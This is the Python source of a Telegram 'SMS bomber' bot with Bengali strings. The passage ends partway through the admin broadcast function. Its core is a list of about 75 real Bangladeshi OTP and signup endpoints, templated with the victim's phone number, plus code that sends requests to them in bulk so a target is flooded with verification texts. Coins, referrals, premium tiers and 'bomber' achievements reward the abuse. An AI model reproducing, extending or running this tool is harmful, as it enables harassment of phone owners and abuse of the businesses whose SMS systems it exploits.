import os
import json
import time
import random
import sqlite3
import requests
import asyncio
import concurrent.futures
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ====================== ডাটাবেস সেটআপ ======================

class Database:
    def __init__(self, db_file="users.db"):
        self.conn = sqlite3.connect(db_file, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.create_tables()
    
    def create_tables(self):
        # ইউজার টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                coins INTEGER DEFAULT 0,
                total_sent INTEGER DEFAULT 0,
                join_date TEXT,
                last_active TEXT,
                is_banned INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0,
                is_free_trial INTEGER DEFAULT 0,
                free_trial_expiry TEXT,
                language TEXT DEFAULT 'bn'
            )
        ''')
        
        # লগ টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                phone TEXT,
                api_count INTEGER,
                success_count INTEGER,
                timestamp TEXT
            )
        ''')
        
        # রেফারেল টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                timestamp TEXT
            )
        ''')
        
        # অ্যাচিভমেন্ট টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS achievements (
                user_id INTEGER,
                achievement_key TEXT,
                earned_date TEXT,
                PRIMARY KEY (user_id, achievement_key)
            )
        ''')
        
        # অ্যাডমিন সেটিংস টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS admin_settings (
                key TEXT PRIMARY KEY,
                value TEXT
            )
        ''')
        
        # API স্ট্যাটস টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS api_stats (
                api_name TEXT,
                total_calls INTEGER DEFAULT 0,
                success_calls INTEGER DEFAULT 0,
                last_used TEXT,
                PRIMARY KEY (api_name)
            )
        ''')
        
        # কাস্টম API টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS custom_apis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                name TEXT,
                url TEXT,
                method TEXT,
                headers TEXT,
                body TEXT,
                created_at TEXT,
                is_active INTEGER DEFAULT 1
            )
        ''')
        
        # ফ্রি ট্রায়াল টেবিল
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS free_trials (
                user_id INTEGER PRIMARY KEY,
                api_id INTEGER,
                start_date TEXT,
                end_date TEXT
            )
        ''')
        
        self.conn.commit()
    
    def get_user(self, user_id):
        self.cursor.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def add_user(self, user_id, username, first_name):
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, coins, join_date, last_active)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, username, first_name, 10, now, now))
        self.conn.commit()
    
    def update_coins(self, user_id, coins):
        self.cursor.execute("UPDATE users SET coins = coins + ? WHERE user_id = ?", (coins, user_id))
        self.conn.commit()
    
    def get_coins(self, user_id):
        self.cursor.execute("SELECT coins FROM users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        return result[0] if result else 0
    
    def add_log(self, user_id, phone, api_count, success_count):
        now = datetime.now().isoformat()
        self.cursor.execute('''
            INSERT INTO logs (user_id, phone, api_count, success_count, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (user_id, phone, api_count, success_count, now))
        self.conn.commit()
    
    def get_stats(self, user_id):
        self.cursor.execute("SELECT total_sent, coins FROM users WHERE user_id = ?", (user_id,))
        return self.cursor.fetchone()
    
    def update_api_stats(self, api_name, success):
        self.cursor.execute('''
            INSERT INTO api_stats (api_name, total_calls, success_calls, last_used)
            VALUES (?, 1, ?, ?)
            ON CONFLICT(api_name) DO UPDATE SET
                total_calls = total_calls + 1,
                success_calls = success_calls + ?,
                last_used = ?
        ''', (api_name, 1 if success else 0, datetime.now().isoformat(), 1 if success else 0, datetime.now().isoformat()))
        self.conn.commit()
    
    def add_free_trial(self, user_id, api_id):
        now = datetime.now().isoformat()
        end_date = (datetime.now() + timedelta(days=1)).isoformat()
        self.cursor.execute('''
            INSERT OR REPLACE INTO free_trials (user_id, api_id, start_date, end_date)
            VALUES (?, ?, ?, ?)
        ''', (user_id, api_id, now, end_date))
        self.cursor.execute("UPDATE users SET is_free_trial = 1, free_trial_expiry = ? WHERE user_id = ?", (end_date, user_id))
        self.conn.commit()
    
    def check_free_trial(self, user_id):
        self.cursor.execute("SELECT is_free_trial, free_trial_expiry FROM users WHERE user_id = ?", (user_id,))
        result = self.cursor.fetchone()
        if result and result[0] == 1:
            expiry = datetime.fromisoformat(result[1])
            if datetime.now() < expiry:
                return True
            else:
                self.cursor.execute("UPDATE users SET is_free_trial = 0 WHERE user_id = ?", (user_id,))
                self.conn.commit()
        return False
    
    def close(self):
        self.conn.close()

# ====================== ভাষা ডিকশনারি ======================

LANGUAGES = {
    "bn": {
        "welcome": "👋 হ্যালো {name}!",
        "send_bomb": "📱 SMS বোমা",
        "coins": "🪙 কয়েন",
        "stats": "📊 স্ট্যাটাস",
        "premium": "⭐ প্রিমিয়াম",
        "help": "📖 সাহায্য",
        "refer": "👥 রেফার",
        "leaderboard": "🏆 লিডারবোর্ড",
        "custom_api": "🔧 কাস্টম API",
        "back": "🔙 ব্যাক",
        "cancel": "❌ বাতিল",
        "free_trial": "🎁 ফ্রি ট্রায়াল"
    },
    "en": {
        "welcome": "👋 Hello {name}!",
        "send_bomb": "📱 SMS Bomb",
        "coins": "🪙 Coins",
        "stats": "📊 Stats",
        "premium": "⭐ Premium",
        "help": "📖 Help",
        "refer": "👥 Refer",
        "leaderboard": "🏆 Leaderboard",
        "custom_api": "🔧 Custom API",
        "back": "🔙 Back",
        "cancel": "❌ Cancel",
        "free_trial": "🎁 Free Trial"
    }
}

# ====================== API ম্যানেজার ======================

class ApiManager:
    @staticmethod
    def get_all_apis():
        """৭৫টি API-এর তালিকা"""
        apis = [
            {"name": "RedX Signup", "url": "https://api.redx.com.bd/v1/user/signup", "method": "POST", 
             "headers": {"Content-Type": "application/json"}, "body": {"phoneNumber": "{phone}"}},
            {"name": "KhaasFood OTP", "url": "https://api.khaasfood.com/api/app/one-time-passwords/token?username={phone}", 
             "method": "GET", "headers": {"User-Agent": "Mozilla/5.0"}},
            {"name": "Bioscope Login", "url": "https://api-dynamic.bioscopelive.com/v2/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"}, 
             "body": {"number": "+88{phone}"}},
            {"name": "Bikroy Login", "url": "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}", 
             "method": "GET", "headers": {"Accept": "application/json"}},
            {"name": "Proiojon Signup", "url": "https://billing.proiojon.com/api/v1/auth/sign-up", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "BeautyBooth Signup", "url": "https://admin.beautybooth.com.bd/api/v2/auth/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Medha OTP", "url": "https://developer.medha.info/api/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "880{phone}"}},
            {"name": "Deeptoplay Login", "url": "https://api.deeptoplay.com/v2/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"number": "+88{phone}"}},
            {"name": "Robi OTP", "url": "https://webapi.robi.com.bd/v1/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone_number": "{phone}"}},
            {"name": "Arogga SMS", "url": "https://api.arogga.com/auth/v1/sms/send", 
             "method": "POST", "headers": {"Content-Type": "multipart/form-data"},
             "body": {"mobile": "{phone}"}},
            {"name": "MyGP OTP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/{phone}", 
             "method": "GET", "headers": {"Accept": "application/json"}},
            {"name": "BDSTall OTP", "url": "https://www.bdstall.com/userRegistration/save_otp_info/", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"Mobile": "{phone}"}},
            {"name": "BCS Exam OTP", "url": "https://bcsexamaid.com/api/generateotp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "DoctorLive OTP", "url": "https://doctorlivebd.com/api/patient/auth/otpsend", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            {"name": "Sheba OTP", "url": "https://accountkit.sheba.xyz/api/shoot-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88{phone}"}},
            {"name": "Apex4U Login", "url": "https://api.apex4u.com/api/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "{phone}"}},
            {"name": "Sindabad OTP", "url": "https://offers.sindabad.com/api/mobile-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88{phone}"}},
            {"name": "Kirei OTP", "url": "https://app.kireibd.com/api/v2/send-login-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"email": "{phone}"}},
            {"name": "Shikho SMS", "url": "https://api.shikho.com/auth/v2/send/sms", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Circle Signup", "url": "https://reseller.circle.com.bd/api/v2/auth/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"email_or_phone": "+88{phone}"}},
            {"name": "BDTickets Auth", "url": "https://api.bdtickets.com:20100/v1/auth", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "+88{phone}"}},
            {"name": "Grameenphone OTP", "url": "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "RFL BestBuy Login", "url": "https://rflbestbuy.com/api/login/", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Chorki Login", "url": "https://api-dynamic.chorki.com/v1/auth/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"number": "{phone}"}},
            {"name": "Hishab Express Login", "url": "https://api.hishabexpress.com/login/status", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Chorcha Auth Check", "url": "https://mujib.chorcha.net/auth/check?phone={phone}", 
             "method": "GET", "headers": {"accept": "*/*"}},
            {"name": "Wafilife OTP", "url": "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}", 
             "method": "GET", "headers": {}},
            {"name": "Robi Account OTP", "url": "https://webapi.robi.com.bd/v1/account/register/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone_number": "{phone}"}},
            {"name": "Chardike OTP", "url": "https://api.chardike.com/api/otp/send", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "E-TestPaper OTP", "url": "https://prod.etestpaper.net/api/v4/auth/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "GPay Signup", "url": "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Applink OTP", "url": "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "88{phone}"}},
            {"name": "Priyoshikkhaloy", "url": "https://app.priyoshikkhaloy.com/api/user/register-login.php", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            {"name": "Kabbik OTP", "url": "https://api.kabbik.com/v1/auth/otpnew", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Salextra", "url": "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"username": "{phone}"}},
            {"name": "Sundora", "url": "https://api.sundora.com.bd/api/user/customer/", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "+880{phone}"}},
            {"name": "MyGP Cinematic", "url": "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Bajistar", "url": "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}", 
             "method": "GET", "headers": {}},
            {"name": "Doctime", "url": "https://api.doctime.com.bd/api/authenticate", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"contact_no": "{phone}"}},
            {"name": "Grameenphone FI", "url": "https://webloginda.grameenphone.com/backend/api/v1/otp", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Meenabazar", "url": "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Medeasy", "url": "https://api.medeasy.health/api/send-otp/+88{phone}/", 
             "method": "GET", "headers": {}},
            {"name": "Iqra Live", "url": "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}", 
             "method": "GET", "headers": {}},
            {"name": "Chokrojan", "url": "https://chokrojan.com/api/v1/passenger/login/mobile", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile_number": "{phone}"}},
            {"name": "Shomvob", "url": "https://backend-api.shomvob.co/api/v2/otp/phone", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "88{phone}"}},
            {"name": "RedX Signup 2", "url": "https://api.redx.com.bd/v1/user/signup", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "{phone}"}},
            {"name": "MyGP Send OTP", "url": "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "BDJobs", "url": "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Ultimate Organic Register", "url": "https://ultimateasiteapi.com/api/register-customer", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"customer_contact": "{phone}"}},
            {"name": "Foodaholic", "url": "https://foodaholic.com.bd/api/v1/auth/forgot-password", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "+88{phone}"}},
            {"name": "KFC BD", "url": "https://api.kfcbd.com/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "GP Offer OTP", "url": "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Eonbazar Register", "url": "https://app.eonbazar.com/api/auth/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Eat-Z", "url": "https://api.eat-z.com/auth/customer/app-connect", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"username": "+880{phone}"}},
            {"name": "Osudpotro", "url": "https://api.osudpotro.com/api/v1/users/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "+88-{phone}"}},
            {"name": "Kormi24", "url": "https://api.kormi24.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Weblogin GP", "url": "https://weblogin.grameenphone.com/backend/api/v1/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"msisdn": "{phone}"}},
            {"name": "Shwapno", "url": "https://www.shwapno.com/api/auth", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNumber": "+88{phone}"}},
            {"name": "Quizgiri", "url": "https://developer.quizgiri.xyz/api/v2.0/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Banglalink MyBL", "url": "https://myblapi.banglalink.net/api/v1/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Walton Plaza", "url": "https://api.waltonplaza.com.bd/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "PBS", "url": "https://apialpha.pbs.com.bd/api/OTP/generateOTP", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"userPhone": "{phone}"}},
            {"name": "Aarong", "url": "https://mcprod.aarong.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "Arogga App", "url": "https://api.arogga.com/auth/v1/sms/send", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobile": "{phone}"}},
            {"name": "Sundarban Courier", "url": "https://api-gateway.sundarbancourierltd.com/graphql", 
             "method": "POST", "headers": {"Content-Type": "application/json"}},
            {"name": "QuizTime", "url": "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "DressUp", "url": "https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Ghoori Learning", "url": "https://api.ghoorilearning.com/api/auth/signup/otp", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile_no": "{phone}"}},
            {"name": "Garibook", "url": "https://api.garibookadmin.com/api/v3/user/login", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"mobile": "{phone}"}},
            {"name": "Fabrilife Signup", "url": "https://fabrilife.com/api/wp-json/wc/v2/user/register", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phone": "{phone}"}},
            {"name": "Fabrilife OTP", "url": "https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{phone}", 
             "method": "POST", "headers": {}},
            {"name": "BTCL BDIA", "url": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp", 
             "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
             "body": {"mobileNo": "{phone}"}},
            {"name": "BTCL PhoneBill", "url": "https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json", 
             "method": "POST", "headers": {"Content-Type": "application/json"},
             "body": {"phoneNbr": "{phone}"}},
        ]
        return apis

    @staticmethod
    def send_request(api, phone):
        try:
            url = api["url"].replace("{phone}", phone)
            headers = api.get("headers", {})
            
            if api["method"] == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:
                body = api.get("body", {})
                if body:
                    for key in body:
                        if isinstance(body[key], str):
                            body[key] = body[key].replace("{phone}", phone)
                
                if "application/json" in str(headers.get("Content-Type", "")):
                    response = requests.post(url, headers=headers, json=body, timeout=5)
                else:
                    response = requests.post(url, headers=headers, data=body, timeout=5)
            
            return response.status_code in [200, 201, 202, 204]
        except:
            return False

# ====================== টেলিগ্রাম বট ======================

class SMSBomberBot:
    def __init__(self, token):
        self.token = token
        self.db = Database()
        self.apis = ApiManager()
        self.app = None
        
        # কনফিগারেশন
        self.COINS_PER_SMS = 1
        self.DAILY_BONUS = 5
        self.REFERRAL_BONUS = 10
        self.PREMIUM_PRICE = 50
        self.CHANNEL_USERNAME = "BlackoutZoneRBX404"
        self.CHANNEL_ID = -1003816732910
        self.MESSAGE_COUNTS = [10, 20, 30, 50, 75, 100, 200, 500]
        self.ADMIN_IDS = [7294948308]
        self.WELCOME_IMAGE = "welcome.jpg"  # আপনার ইমেজ ফাইলের নাম
    
    def get_enhanced_main_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📱 SMS বোমা", callback_data="send_bomb")],
            [InlineKeyboardButton("🪙 কয়েন", callback_data="coins"), 
             InlineKeyboardButton("⭐ প্রিমিয়াম", callback_data="premium")],
            [InlineKeyboardButton("📊 স্ট্যাটাস", callback_data="stats"),
             InlineKeyboardButton("🏆 লিডারবোর্ড", callback_data="leaderboard")],
            [InlineKeyboardButton("👥 রেফার", callback_data="refer"),
             InlineKeyboardButton("🔧 কাস্টম API", callback_data="custom_api")],
            [InlineKeyboardButton("🎁 ফ্রি ট্রায়াল", callback_data="free_trial"),
             InlineKeyboardButton("🌐 ভাষা", callback_data="language")],
            [InlineKeyboardButton("📖 সাহায্য", callback_data="help")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_custom_count_keyboard(self):
        keyboard = []
        row = []
        for count in self.MESSAGE_COUNTS:
            row.append(InlineKeyboardButton(f"{count}", callback_data=f"count_{count}"))
            if len(row) == 4:
                keyboard.append(row)
                row = []
        if row:
            keyboard.append(row)
        keyboard.append([InlineKeyboardButton("✏️ কাস্টম", callback_data="custom_count")])
        keyboard.append([InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")])
        return InlineKeyboardMarkup(keyboard)
    
    def get_language_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn")],
            [InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
            [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def get_join_keyboard(self):
        keyboard = [
            [InlineKeyboardButton("📢 চ্যানেল জয়েন করুন", url=f"https://t.me/{self.CHANNEL_USERNAME}")],
            [InlineKeyboardButton("✅ চেক করুন", callback_data="check_join")]
        ]
        return InlineKeyboardMarkup(keyboard)
    
    def format_result_message(self, phone, count, success_count, fail_count, results):
        emoji = "✅" if success_count > count/2 else "⚠️"
        
        # প্রোগ্রেস বার তৈরি
        total = success_count + fail_count
        if total > 0:
            progress = int((success_count / total) * 50)
            bar = "▓" * progress + "░" * (50 - progress)
        else:
            bar = "░" * 50
        
        text = f"""
{emoji} **SMS বোমা রিপোর্ট**

📱 টার্গেট: `{phone}`
📨 চেষ্টা: {count}
✅ সফল: {success_count}
❌ ব্যর্থ: {fail_count}
📊 সাফল্য: {(success_count/count*100):.1f}%

📈 **প্রোগ্রেস বার:**
`{bar}` {int((success_count/count)*100) if count > 0 else 0}%

🔍 **বিস্তারিত:**
{chr(10).join(results[:15])}
{f'... এবং বাকি {len(results)-15}টি' if len(results) > 15 else ''}

📢 **চ্যানেল:** @{self.CHANNEL_USERNAME}
"""
        return text
    
    def smart_delay(self, api_name, attempt):
        delays = {
            "RedX": 1.0,
            "Robi": 1.5,
            "GP": 0.8,
            "Bikroy": 1.2,
            "default": 0.5
        }
        base_delay = delays.get(api_name.split()[0] if api_name else "default", delays["default"])
        if attempt > 1:
            base_delay *= (attempt * 0.5)
        return min(base_delay, 5.0)
    
    def is_suspicious_activity(self, user_id):
        self.db.cursor.execute("""
            SELECT COUNT(*) FROM logs 
            WHERE user_id = ? 
            AND timestamp > datetime('now', '-5 minutes')
        """, (user_id,))
        recent = self.db.cursor.fetchone()[0]
        if recent > 50:
            return True, "অতিরিক্ত রিকুয়েস্ট"
        
        self.db.cursor.execute("""
            SELECT COUNT(*) FROM logs 
            WHERE user_id = ? 
            AND timestamp > datetime('now', '-1 minute')
        """, (user_id,))
        per_minute = self.db.cursor.fetchone()[0]
        if per_minute > 10:
            return True, "রেট লিমিট এক্সিড"
        return False, ""
    
    def check_achievements(self, user_id, total_sent):
        achievements = {
            "first_bomb": {"name": "🎯 প্রথম বোমা", "condition": total_sent >= 1},
            "bomber": {"name": "💣 বোম্বার", "condition": total_sent >= 100},
            "legend": {"name": "👑 লেজেন্ড", "condition": total_sent >= 1000},
            "pro_bomber": {"name": "🔥 প্রো বোম্বার", "condition": total_sent >= 500},
            "king": {"name": "🤴 বোম্বার কিং", "condition": total_sent >= 5000},
        }
        new_achievements = []
        for key, ach in achievements.items():
            if ach["condition"]:
                self.db.cursor.execute(
                    "SELECT 1 FROM achievements WHERE user_id = ? AND achievement_key = ?",
                    (user_id, key)
                )
                if not self.db.cursor.fetchone():
                    self.db.cursor.execute(
                        "INSERT INTO achievements (user_id, achievement_key, earned_date) VALUES (?, ?, ?)",
                        (user_id, key, datetime.now().isoformat())
                    )
                    self.db.conn.commit()
                    new_achievements.append(ach["name"])
        return new_achievements
    
    async def check_channel_membership(self, user_id):
        try:
            if self.app is None:
                return True
            chat_member = await self.app.bot.get_chat_member(self.CHANNEL_ID, user_id)
            return chat_member.status in ["member", "administrator", "creator"]
        except:
            return True    
    # ====================== অ্যাডমিন ফাংশন ======================
    
    async def admin_dashboard(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.ADMIN_IDS:
            await update.message.reply_text("❌ আপনি অ্যাডমিন নন!")
            return
        
        self.db.cursor.execute("SELECT COUNT(*) FROM users")
        total_users = self.db.cursor.fetchone()[0]
        
        self.db.cursor.execute("SELECT COUNT(*) FROM users WHERE date(join_date) = date('now')")
        today_users = self.db.cursor.fetchone()[0]
        
        self.db.cursor.execute("SELECT COUNT(*) FROM users WHERE date(join_date) = date('now', '-1 day')")
        yesterday_users = self.db.cursor.fetchone()[0]
        
        self.db.cursor.execute("SELECT SUM(total_sent) FROM users")
        total_sms = self.db.cursor.fetchone()[0] or 0
        
        self.db.cursor.execute("SELECT SUM(coins) FROM users")
        total_coins = self.db.cursor.fetchone()[0] or 0
        
        self.db.cursor.execute("SELECT COUNT(*) FROM users WHERE is_premium = 1")
        premium_users = self.db.cursor.fetchone()[0]
        
        self.db.cursor.execute("SELECT COUNT(*) FROM users WHERE is_free_trial = 1")
        free_trial_users = self.db.cursor.fetchone()[0]
        
        self.db.cursor.execute("SELECT username, total_sent FROM users ORDER BY total_sent DESC LIMIT 5")
        top_users = self.db.cursor.fetchall()
        
        # API সাফল্যের হার
        self.db.cursor.execute("""
            SELECT 
                SUM(total_calls) as total,
                SUM(success_calls) as success
            FROM api_stats
        """)
        result = self.db.cursor.fetchone()
        total_api_calls = result[0] if result and result[0] else 0
        success_api_calls = result[1] if result and result[1] else 0
        api_success_rate = (success_api_calls / total_api_calls * 100) if total_api_calls > 0 else 0
        
        text = f"""
📊 **অ্যাডমিন ড্যাশবোর্ড**

👥 **ইউজার স্ট্যাটস:**
• মোট ইউজার: {total_users}
• আজ যোগ: {today_users}
• গতকাল: {yesterday_users}
• প্রিমিয়াম: {premium_users}
• ফ্রি ট্রায়াল: {free_trial_users}

📨 **SMS স্ট্যাটস:**
• মোট SMS: {total_sms}
• মোট কয়েন: {total_coins}
• API কল: {total_api_calls}
• API সাফল্য: {api_success_rate:.1f}%

🏆 **টপ ৫ বোম্বার:**
{chr(10).join([f"{i+1}. @{u[0] or 'Unknown'} - {u[1]} SMS" for i, u in enumerate(top_users)])}

📊 **API পারফরম্যান্স:**
`/api_stats` দেখুন
"""
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 API স্ট্যাটস", callback_data="admin_api_stats")],
            [InlineKeyboardButton("📢 ব্রডকাস্ট", callback_data="admin_broadcast")],
            [InlineKeyboardButton("🔙 ব্যাক", callback_data="back_main")]
        ]))
    
    async def admin_api_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        
        self.db.cursor.execute("""
            SELECT api_name, total_calls, success_calls 
            FROM api_stats 
            ORDER BY total_calls DESC 
            LIMIT 15
        """)
        stats = self.db.cursor.fetchall()
        
        text = "📊 **টপ ১৫ API পারফরম্যান্স**\n\n"
        for i, (name, total, success) in enumerate(stats, 1):
            rate = (success / total * 100) if total > 0 else 0
            text += f"{i}. {name[:20]}...\n   📞 {total} | ✅ {success} | 🎯 {rate:.1f}%\n\n"
        
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="admin_dashboard")]]))
    
    async def admin_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "📢 **ব্রডকাস্ট মেসেজ**\n\n"
            "সব ইউজারকে মেসেজ পাঠাতে /broadcast কমান্ড ব্যবহার করুন।\n"
            "উদাহরণ: `/broadcast আপনার মেসেজ এখানে`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 ব্যাক", callback_data="admin_dashboard")]])
        )
    
    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.ADMIN_IDS:
            await update.message.reply_text("❌ আপনি অ্যাডমিন নন!")
            return
        
        message = " ".join(context.args)
        if not message:
            await update.message.reply_text("❌ মেসেজ লিখুন!\nউদাহরণ: `/broadcast আপনার মেসেজ`")
            return
        
        self.db.cursor.execute("SELECT user_id FROM users")
        users = self.db.cursor.fetchall()
        
        sent = 0
        failed = 0
        
        progress_msg = await update.message.reply_text("⏳ ব্রডকাস্ট শুরু হচ্ছে...")
        
        for i, (user_id,) in enumerate(users):
            try:
                await context.bot.send_message(user_id, f"📢 **ব্রডকাস্ট মেসেজ**\n\n{message}")
                sent += 1
            except:
                failed += 1
